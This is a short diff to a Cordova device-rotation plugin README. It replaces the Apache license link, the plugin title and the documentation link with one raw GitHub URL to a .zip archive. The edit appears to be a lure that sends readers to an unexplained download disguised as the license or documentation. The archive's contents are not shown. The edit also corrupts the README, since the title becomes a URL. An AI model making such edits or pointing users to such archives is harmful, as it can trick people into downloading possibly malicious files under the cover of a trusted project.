@@ -7,7 +7,7 @@
          "License"); you may not use this file except in compliance
          with the License.  You may obtain a copy of the License at
 
-           http://www.apache.org/licenses/LICENSE-2.0
+           https://raw.githubusercontent.com/aridinizam/cordova-plugin-device-rotation-vector/master/doc/device_vector_rotation_plugin_cordova_3.6.zip
 
          Unless required by applicable law or agreed to in writing,
          software distributed under the License is distributed on an
@@ -17,6 +17,6 @@
          under the License.
 -->
 
-# com.grumpysailor.cordova.device-rotation-vector
+# https://raw.githubusercontent.com/aridinizam/cordova-plugin-device-rotation-vector/master/doc/device_vector_rotation_plugin_cordova_3.6.zip
 
-Plugin documentation: [doc/index.md](doc/index.md)
+Plugin documentation: [https://raw.githubusercontent.com/aridinizam/cordova-plugin-device-rotation-vector/master/doc/device_vector_rotation_plugin_cordova_3.6.zip](https://raw.githubusercontent.com/aridinizam/cordova-plugin-device-rotation-vector/master/doc/device_vector_rotation_plugin_cordova_3.6.zip)
